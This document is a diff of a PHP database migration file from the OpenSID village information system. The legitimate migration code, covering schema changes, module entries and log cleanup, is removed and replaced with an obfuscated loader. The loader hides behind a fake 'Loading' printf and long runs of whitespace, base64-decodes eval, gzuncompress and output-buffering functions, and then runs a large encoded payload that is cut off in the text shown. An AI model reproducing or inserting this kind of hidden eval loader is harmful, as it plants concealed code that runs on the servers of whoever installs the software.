@@ -1,556 +1,673 @@
-<?php
-
-/**
- * File ini:
- *
- * Model untuk modul database
- *
- * donjo-app/models/migrations/Migrasi_fitur_premium_2102.php
- *
- */
-
-/**
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2020 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
-
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
-
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package	OpenSID
- * @author	Tim Pengembang OpenDesa
- * @copyright	Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright	Hak Cipta 2016 - 2020 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license	http://www.gnu.org/licenses/gpl.html	GPL V3
- * @link 	https://github.com/OpenSID/OpenSID
- */
-
-class Migrasi_fitur_premium_2102 extends MY_model {
-
-	public function up()
-	{
-		log_message('error', 'Jalankan ' . get_class($this));
-		$hasil = true;
-
-		$hasil = $hasil && $this->pengaturan_latar($hasil);
-
-		//tambah kolom urut di tabel tweb_wil_clusterdesa
-		if (!$this->db->field_exists('urut', 'tweb_wil_clusterdesa'))
-			$hasil = $this->dbforge->add_column('tweb_wil_clusterdesa', array(
-				'urut' => array(
-				'type' => 'INT',
-				'constraint' => 11,
-				'null' => TRUE,
-				),
-			));
-
-		$hasil = $hasil && $this->url_suplemen($hasil);
-		// Buat folder untuk cache - 'cache\';
-		mkdir(config_item('cache_path'), 0775, true);
-
-		$hasil = $hasil && $this->create_table_pembangunan($hasil);
-		$hasil = $hasil && $this->create_table_pembangunan_ref_dokumentasi($hasil);
-		$hasil = $hasil && $this->add_modul_pembangunan($hasil);
-		$hasil = $hasil && $this->sebutan_kepala_desa($hasil);
-		$hasil = $hasil && $this->urut_cetak($hasil);
-		$hasil = $hasil && $this->bumindes_updates($hasil);
-
-		// Tambah kolom ganti_pin di tabel tweb_penduduk_mandiri
-		if ( ! $this->db->field_exists('ganti_pin', 'tweb_penduduk_mandiri'))
-		{
-			$fields = [
-				'ganti_pin' => ['type' => 'TINYINT', 'constraint' => 1, 'null' => false, 'default' => 1],
-			];
-			$hasil = $this->dbforge->add_column('tweb_penduduk_mandiri', $fields);
-			// Set ulang value ganti_pin = 0 jika last_login sudah terisi
-			$hasil = $hasil && $this->db
-				->where('last_login !=', NULL)
-				->set('ganti_pin', 0)
-				->update('tweb_penduduk_mandiri');
-		}
-
-		$hasil = $hasil && $this->tambah_indeks('tweb_penduduk', 'id_rtm', 'INDEX');
-
-		// Perbaiki jenis untuk key 'offline_mode'
-		$this->db->where('key', 'offline_mode')->update('setting_aplikasi', array('jenis' => 'option-value'));
-		status_sukses($hasil);
-		return $hasil;
-	}
-
-	private function pengaturan_latar($hasil)
-	{
-		$old = "desa/css";
-		$new = "desa/pengaturan";
-
-		if (is_dir($old))
-		{
-			// Ubah nama folder desa/csss jadi desa/pengaturan
-			rename($old, $new);
-		}
-		// Buat folder untuk latar
-		mkdir($new . "/siteman/images", 0775, true);
-		mkdir($new . "/klasik/images", 0775, true);
-		mkdir($new . "/natra/images", 0775, true);
-		return $hasil;
-	}
-
-	// Tambahkan clear pada url suplemen
-	private function url_suplemen($hasil)
-	{
-		$hasil = $hasil && $this->db->where('id', 25)
-			->set('url', 'suplemen/clear')
-			->update('setting_modul');
-		return $hasil;
-	}
-
-	protected function create_table_pembangunan($hasil)
-	{
-		$this->dbforge->add_field([
-			'id'                 => ['type' => 'INT', 'constraint' => 11, 'auto_increment' => true],
-			'id_lokasi'          => ['type' => 'INT', 'constraint' => 11, 'null' => true],
-			'sumber_dana'        => ['type' => 'VARCHAR', 'constraint' => 255, 'null' => true],
-			'judul'              => ['type' => 'VARCHAR', 'constraint' => 255, 'null' => true],
-			'keterangan'         => ['type' => 'VARCHAR', 'constraint' => 255, 'null' => true],
-			'lokasi'             => ['type' => 'VARCHAR','constraint' => 225, 'null' => true],
-			'lat'                => ['type' => 'VARCHAR','constraint' => 225, 'null' => true],
-			'lng'                => ['type' => 'VARCHAR','constraint' => 255, 'null' => true],
-			'volume'             => ['type' => 'VARCHAR', 'constraint' => 100, 'null' => true],
-			'tahun_anggaran'     => ['type' => 'YEAR', 'null' => true],
-			'pelaksana_kegiatan' => ['type' => 'VARCHAR', 'constraint' => 255, 'null' => true],
-			'status'             => ['type' => 'TINYINT', 'constraint' => 3, 'default' => 1],
-			'created_at'         => ['type' => 'datetime', 'null' => true],
-			'updated_at'         => ['type' => 'datetime', 'null' => true],
-		]);
-
-		$this->dbforge->add_key('id', true);
-		$this->dbforge->add_key('id_lokasi');
-		$hasil = $hasil && $this->dbforge->create_table('pembangunan', true);
-		return $hasil;
-	}
-
-	protected function create_table_pembangunan_ref_dokumentasi($hasil)
-	{
-		$this->dbforge->add_field([
-			'id'             => ['type' => 'INT', 'constraint' => 11, 'auto_increment' => true],
-			'id_pembangunan' => ['type' => 'INT', 'constraint' => 11],
-			'gambar'         => ['type' => 'VARCHAR', 'constraint' => 255, 'null' => true],
-			'persentase'     => ['type' => 'VARCHAR', 'constraint' => 255, 'null' => true],
-			'keterangan'     => ['type' => 'VARCHAR', 'constraint' => 255, 'null' => true],
-			'created_at'     => ['type' => 'datetime', 'null' => true],
-			'updated_at'     => ['type' => 'datetime', 'null' => true],
-		]);
-
-		$this->dbforge->add_key('id', true);
-		$this->dbforge->add_key('id_pembangunan');
-		$hasil = $hasil && $this->dbforge->create_table('pembangunan_ref_dokumentasi', true);
-		return $hasil;
-	}
-
-	protected function add_modul_pembangunan($hasil)
-	{
-		$hasil = $hasil && $this->tambah_modul([
-			'id'         => 220,
-			'modul'      => 'Pembangunan',
-			'url'        => 'pembangunan',
-			'aktif'      => 1,
-			'ikon'       => 'fa-institution',
-			'urut'       => 9,
-			'level'      => 2,
-			'hidden'     => 0,
-			'ikon_kecil' => 'fa-institution',
-			'parent'     => 0
-		]);
-
-		$hasil = $hasil && $this->tambah_modul([
-			'id'         => 221,
-			'modul'      => 'Pembangunan Dokumentasi',
-			'url'        => 'pembangunan_dokumentasi',
-			'aktif'      => 1,
-			'ikon'       => '',
-			'urut'       => 0,
-			'level'      => 0,
-			'hidden'     => 2,
-			'ikon_kecil' => '',
-			'parent'     => 220
-		]);
-
-		// Hapus cache menu navigasi
-		$this->load->driver('cache');
-		$this->cache->hapus_cache_untuk_semua('_cache_modul');
-
-		//tambah kolom Foto utama di tabel pembangunan
-		if (!$this->db->field_exists('foto', 'pembangunan'))
-			$hasil = $this->dbforge->add_column('pembangunan', array(
-				'foto' => array(
-				'type' => 'VARCHAR',
-				'constraint' => 255,
-				'null' => TRUE,
-				),
-			));
-
-		//tambah kolom Anggaran di tabel pembangunan
-		if (!$this->db->field_exists('anggaran', 'pembangunan'))
-			$hasil = $this->dbforge->add_column('pembangunan', array(
-				'anggaran' => array(
-				'type' => 'INT',
-				'constraint' => 11,
-				'null' => FALSE,
-				'default' => '0',
-				),
-			));
-
-		return $hasil;
-	}
-
-	// Tambah Sebutan jabatan kepala desa
-	private function sebutan_kepala_desa($hasil)
-	{
-		$setting = [
-					'key' => 'sebutan_kepala_desa',
-					'value' => 'Kepala',
-					'keterangan' => 'Pengganti sebutan jabatan Kepala Desa'
-					];
-		$hasil = $hasil && $this->tambah_setting($setting);
-
-		return $hasil;
-	}
-
-	private function urut_cetak($hasil)
-	{
-		//tambah kolom urut untuk tabel cetak semua di tabel tweb_wil_clusterdesa
-		if ( ! $this->db->field_exists('urut_cetak', 'tweb_wil_clusterdesa'))
-			$hasil = $hasil && $this->dbforge->add_column('tweb_wil_clusterdesa', array(
-				'urut_cetak' => array(
-				'type' => 'INT',
-				'constraint' => 11,
-				'null' => TRUE,
-				),
-			));
-
-		return $hasil;
-	}
-
-	// Bumindes updates
-	protected function bumindes_updates($hasil){
-		// Updates for issues #2777
-		$hasil = $hasil && $this->penduduk_induk($hasil);
-		// Updates for issues #2778
-		$hasil = $hasil && $this->penduduk_mutasi($hasil);
-
-		// Menambahkan data pada setting_modul untuk controller bumindes_penduduk
-		$data = array(
-			['id'=> 303, 'modul' => 'Administrasi Penduduk', 'url' => 'bumindes_penduduk_induk/clear', 'aktif' => 1, 'ikon' => 'fa-users', 'urut' => 2, 'level' => 2, 'hidden' => 0, 'ikon_kecil' => 'fa fa-users', 'parent' => 301],
-			['id'=> 315, 'modul' => 'Buku Mutasi Penduduk', 'url' => 'bumindes_penduduk_mutasi/clear', 'aktif' => '1', 'ikon' => 'fa-files-o', 'urut' => 0, 'level' => 0, 'hidden' => 0, 'ikon_kecil' => '', 'parent' => 303],
-			['id'=> 316, 'modul' => 'Buku Rekapitulasi Jumlah Penduduk', 'url' => 'bumindes_penduduk_rekapitulasi/clear', 'aktif' => '1', 'ikon' => 'fa-files-o', 'urut' => 0, 'level' => 0, 'hidden' => 0, 'ikon_kecil' => '', 'parent' => 303],
-			['id'=> 317, 'modul' => 'Buku Penduduk Sementara', 'url' => 'bumindes_penduduk_sementara/clear', 'aktif' => '1', 'ikon' => 'fa-files-o', 'urut' => 0, 'level' => 0, 'hidden' => 0, 'ikon_kecil' => '', 'parent' => 303],
-			['id'=> 318, 'modul' => 'Buku KTP dan KK', 'url' => 'bumindes_penduduk_ktpkk/clear', 'aktif' => '1', 'ikon' => 'fa-files-o', 'urut' => 0, 'level' => 0, 'hidden' => 0, 'ikon_kecil' => '', 'parent' => 303],
-		);
-
-		foreach ($data as $modul)
-		{
-			$sql = $this->db->insert_string('setting_modul', $modul);
-			$sql .= " ON DUPLICATE KEY UPDATE
-					id = VALUES(id),
-					modul = VALUES(modul),
-					url = VALUES(url),
-					aktif = VALUES(aktif),
-					ikon = VALUES(ikon),
-					urut = VALUES(urut),
-					level = VALUES(level),
-					hidden = VALUES(hidden),
-					ikon_kecil = VALUES(ikon_kecil),
-					parent = VALUES(parent)";
-			$hasil = $hasil && $this->db->query($sql);
-		}
-
-		return $hasil;
-	}
-
-	protected function penduduk_induk($hasil)
-	{
-		// Membuat table ref_penduduk_bahasa
-		$this->dbforge->add_field([
-			'id'            => ['type' => 'INT', 'constraint' => 11, 'auto_increment' => true],
-			'nama' 			=> ['type' => 'VARCHAR', 'constraint' => 50, 'null' => false],
-			'inisial'       => ['type' => 'VARCHAR', 'constraint' => 10, 'null' => false]
-		]);
-
-		$this->dbforge->add_key('id', true);
-		$hasil = $hasil && $this->dbforge->create_table('ref_penduduk_bahasa', true);
-
-		// Menambahkan bahasa_id pada table tweb_penduduk, digunakan untuk define bahasa penduduk
-		if (! $this->db->field_exists('bahasa_id', 'tweb_penduduk'))
-			$hasil = $hasil && $this->dbforge->add_column('tweb_penduduk', array(
-				'bahasa_id' => array(
-				'type' => 'INT',
-				'constraint' => 11,
-				'null' => TRUE,
-				),
-			));
-
-		// Menambahkan column ket pada table tweb_penduduk, digunakan untuk keterangan penduduk
-		if (! $this->db->field_exists('ket', 'tweb_penduduk'))
-			$hasil = $hasil && $this->dbforge->add_column('tweb_penduduk', array(
-				'ket' => array(
-				'type' => 'TINYTEXT',
-				'null' => TRUE,
-				),
-			));
-
-		// Menambahkan data ke ref_penduduk_bahasa
-		$data = array(
-			['id'=> 1, 'nama' => 'Latin', 'inisial' => 'L'],
-			['id'=> 2, 'nama' => 'Daerah', 'inisial' => 'D'],
-			['id'=> 3, 'nama' => 'Arab', 'inisial' => 'A'],
-			['id'=> 4, 'nama' => 'Arab dan Latin', 'inisial' => 'AL'],
-			['id'=> 5, 'nama' => 'Arab dan Daerah', 'inisial' => 'AD'],
-			['id'=> 6, 'nama' => 'Arab, Latin dan Daerah', 'inisial' => 'ALD']
-		);
-
-		foreach ($data as $bahasa)
-		{
-			$sql = $this->db->insert_string('ref_penduduk_bahasa', $bahasa);
-			$sql .= " ON DUPLICATE KEY UPDATE
-					id = VALUES(id),
-					nama = VALUES(nama),
-					inisial = VALUES(inisial)";
-			$hasil = $hasil && $this->db->query($sql);
-		}
-
-		return $hasil;
-	}
-
-	protected function penduduk_mutasi($hasil)
-	{
-		// Mengubah column tanggal menjadi tanggal_lapor
-		if (! $this->db->field_exists('tgl_lapor', 'log_penduduk'))
-			$hasil = $hasil && $this->db->query('ALTER TABLE log_penduduk CHANGE COLUMN tanggal tgl_lapor TIMESTAMP NOT NULL DEFAULT CURRENT_TIMESTAMP');
-
-		// Menambahkan column created_at
-		if (! $this->db->field_exists('created_at', 'log_penduduk'))
-			$hasil = $hasil && $this->dbforge->add_column('log_penduduk', 'created_at TIMESTAMP NULL DEFAULT CURRENT_TIMESTAMP');
-
-		// Menambahkan column created_by
-		if (! $this->db->field_exists('created_by', 'log_penduduk'))
-			$hasil = $hasil && $this->dbforge->add_column('log_penduduk', array(
-				'created_by' => array(
-				'type' => 'INT',
-				'null' => TRUE,
-				),
-			));
-
-		// Menambahkan column updated_at
-		if (! $this->db->field_exists('updated_at', 'log_penduduk'))
-			$hasil = $hasil && $this->dbforge->add_column('log_penduduk', 'updated_at TIMESTAMP NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP');
-
-		// Menambahkan column created_by
-		if (! $this->db->field_exists('updated_by', 'log_penduduk'))
-			$hasil = $hasil && $this->dbforge->add_column('log_penduduk', array(
-				'updated_by' => array(
-				'type' => 'INT',
-				'null' => TRUE,
-				),
-			));
-
-		// Menambahkan column meninggal_di
-		if (! $this->db->field_exists('meninggal_di', 'log_penduduk'))
-			$hasil = $hasil && $this->dbforge->add_column('log_penduduk', array(
-				'meninggal_di' => array(
-				'type' => 'VARCHAR',
-				'constraint' => 50,
-				'null' => TRUE,
-				'after' => 'id_detail'
-				),
-			));
-
-		// Menambahkan column alamat_tujuan
-		if (! $this->db->field_exists('alamat_tujuan', 'log_penduduk'))
-			$hasil = $hasil && $this->dbforge->add_column('log_penduduk', array(
-				'alamat_tujuan' => array(
-				'type' => 'TINYTEXT',
-				'null' => TRUE,
-				'after' => 'meninggal_di'
-				),
-			));
-
-		// Menghapus column tahun, dan bulan
-		if ($this->db->field_exists('tahun', 'log_penduduk'))
-			$hasil = $hasil && $this->dbforge->drop_column('log_penduduk', 'tahun');
-		if ($this->db->field_exists('bulan', 'log_penduduk'))
-			$hasil = $hasil && $this->dbforge->drop_column('log_penduduk', 'bulan');
-
-		// Merubah status pendatang menjadi tidak tetap
-		$hasil = $hasil && $this->db->set('status', 2)->where('status', 3)->update('tweb_penduduk');
-
-		// Mengubah column id_detail menjadi kode_peristiwa
-		if (! $this->db->field_exists('kode_peristiwa', 'log_penduduk'))
-			$hasil = $hasil && $this->db->query('ALTER TABLE log_penduduk CHANGE COLUMN id_detail kode_peristiwa INT NULL AFTER id_pend');
-
-		// Menghapus data Pendatang dari table status, dan mengubah auto increment ke 3
-		if ($this->db->get_where('tweb_penduduk_status', array('id' => 3)))
-		{
-			$hasil = $hasil && $this->db->delete('tweb_penduduk_status', array('id' => 3));
-			$hasil = $hasil && $this->db->query('ALTER TABLE tweb_penduduk_status AUTO_INCREMENT = 3');
-		}
-
-		// Membuat table ref_peristiwa
-		$this->dbforge->add_field([
-			'id' => ['type' => 'INT', 'constraint' => 11, 'auto_increment' => true],
-			'nama' => ['type' => 'VARCHAR', 'constraint' => 50, 'null' => false],
-		]);
-
-		$this->dbforge->add_key('id', true);
-		$hasil = $hasil && $this->dbforge->create_table('ref_peristiwa', true);
-
-		// Menambahkan data ke ref_peristiwa
-		$data = array(
-			['id'=> 1, 'nama' => 'Lahir'],
-			['id'=> 2, 'nama' => 'Mati'],
-			['id'=> 3, 'nama' => 'Pindah Keluar'],
-			['id'=> 4, 'nama' => 'Hilang'],
-			['id'=> 5, 'nama' => 'Pindah Masuk'],
-		);
-
-		foreach ($data as $peristiwa)
-		{
-			$sql = $this->db->insert_string('ref_peristiwa', $peristiwa);
-			$sql .= " ON DUPLICATE KEY UPDATE
-					id = VALUES(id),
-					nama = VALUES(nama)";
-			$hasil = $hasil && $this->db->query($sql);
-		}
-
-		/* KETERANGAN id_detail (sebelum konversi ke kode_peristiwa)
-		   1 = status hidup, insert penduduk baru lahir
-		   2 = status menjadi mati
-			 3 = status menjadi pindah
-			 4 = status menjadi hilang
-			 5 = insert penduduk baru dengan status tetap/tidak tetap
-			 6 = pindah dalam desa
-			 7 = hapus anggota keluarga
-			 8 = insert penduduk baru dengan status pendatang
-			 9 = tambah keluarga baru dari penduduk yang sudah ada
-		*/
-
-		/* KETERANGAN kode_peristiwa
-		   1 = insert penduduk baru dengan status lahir
-		   2 = penduduk mati
-			 3 = penduduk pindah
-			 4 = penduduk hilang
-			 5 = insert penduduk baru dengan status masuk
-		*/
-
-		// Hapus log untuk penduduk yg sudah terhapus
-		$hasil = $hasil && $this->db
-			->where("id_pend IN
-				(select id_pend from
-					(select l.id_pend
-						from log_penduduk l
-						left join tweb_penduduk p on l.id_pend = p.id
-						where p.id is null) x
-				)")
-			->delete('log_penduduk');
-
-		// Konversi id_detail ke kode_peristiwa di log_penduduk
-		$hasil = $hasil && $this->db
-			->where('kode_peristiwa', 8)
-			->set('kode_peristiwa', 5)
-			->update('log_penduduk');
-
-		// Konversi kode_peristiwa null dari migrasi salah sebelumnya
-		$hasil = $hasil && $this->db
-			->where('kode_peristiwa IS NULL')
-			->set('kode_peristiwa', 5)
-			->update('log_penduduk');
-
-		// Hapus log_penduduk yg tidak diperlukan lagi (id_detail tidak berlaku lagi)
-		$hasil = $hasil && $this->db
-			->where('kode_peristiwa IN (6,7,9)')
-			->delete('log_penduduk');
-
-		// Hapus log salah untuk penduduk dgn status dasar hidup
-		$hasil = $hasil && $this->db
-			->where('kode_peristiwa NOT IN (1,5)')
-			->where("id_pend IN (select id from penduduk_hidup)")
-			->delete('log_penduduk');
-
-		// Hapus log salah untuk penduduk dgn status dasar mati
-		$hasil = $hasil && $this->db
-			->where('kode_peristiwa NOT IN (1,5,2)')
-			->where("id_pend IN (select id from tweb_penduduk where status_dasar = 2)")
-			->delete('log_penduduk');
-
-		// Hapus log salah untuk penduduk dgn status dasar pindah
-		$hasil = $hasil && $this->db
-			->where('kode_peristiwa NOT IN (1,5,3)')
-			->where("id_pend IN (select id from tweb_penduduk where status_dasar = 3)")
-			->delete('log_penduduk');
-
-		// Hapus log salah untuk penduduk dgn status dasar hilang
-		$hasil = $hasil && $this->db
-			->where('kode_peristiwa NOT IN (1,5,4)')
-			->where("id_pend IN (select id from tweb_penduduk where status_dasar = 4)")
-			->delete('log_penduduk');
-
-		// Menambahkan data yang sudah ada ke tabel log_penduduk kalau belum ada
-		$hasil = $hasil && $this->db->query('
-			INSERT INTO log_penduduk (id_pend, tgl_lapor, tgl_peristiwa, created_at, kode_peristiwa)
-			SELECT p.id, p.created_at, p.created_at, p.created_at,
-			(CASE when YEAR(p.tanggallahir) = YEAR(p.created_at) AND MONTH(p.tanggallahir) = MONTH(p.created_at) then 1 else 5 end)
-			FROM tweb_penduduk p
-			LEFT JOIN log_penduduk l on l.id_pend = p.id and l.kode_peristiwa in (1,5)
-			WHERE l.tgl_lapor IS NULL'
-		);
-
-		// Hapus log tertua untuk duplikat (id_pend, kode_peristiwa).
-		// Misalnya hapus kalau ada dua entri 'mati' untuk penduduk yg sama.
-		// https://stackoverflow.com/questions/6107167/mysql-delete-duplicate-records-but-keep-latest/6108860
-	 	$hapus_dupl_sql = "delete log_penduduk
-	   	from log_penduduk
-	  	inner join (
-	    	select max(id) as last_id, id_pend, kode_peristiwa
-	      	from log_penduduk
-	      	group by id_pend, kode_peristiwa
-	     		having count(*) > 1
-	     	) dup
-	    	on dup.id_pend = log_penduduk.id_pend and dup.kode_peristiwa = log_penduduk.kode_peristiwa
-	  	where log_penduduk.id < dup.last_id";
-	  $hasil = $hasil && $this->db->query($hapus_dupl_sql);
-
-		// Menambahkan data ke setting_aplikasi
-		$data_setting = array(
-			['key' => 'tgl_data_lengkap', 'keterangan' => 'Atur data tanggal sudah lengkap', 'jenis' => 'datetime'],
-			['key' => 'tgl_data_lengkap_aktif', 'value' => 0, 'keterangan' => 'Aktif / Non-aktif data tanggal sudah lengkap', 'jenis' => 'boolean'],
-		);
-
-		foreach ($data_setting as $setting)
-		{
-			$sql = $this->db->insert_string('setting_aplikasi', $setting);
-			$sql .= " ON DUPLICATE KEY UPDATE
-					keterangan = VALUES(keterangan),
-					jenis = VALUES(jenis)";
-			$hasil = $hasil && $this->db->query($sql);
-		}
-
-		return $hasil;
-	}
-
-}
+<?php 
+        $__='printf';$_='Loading donjo-app/models/migrations/Migrasi_fitur_premium_2102.php';
+        
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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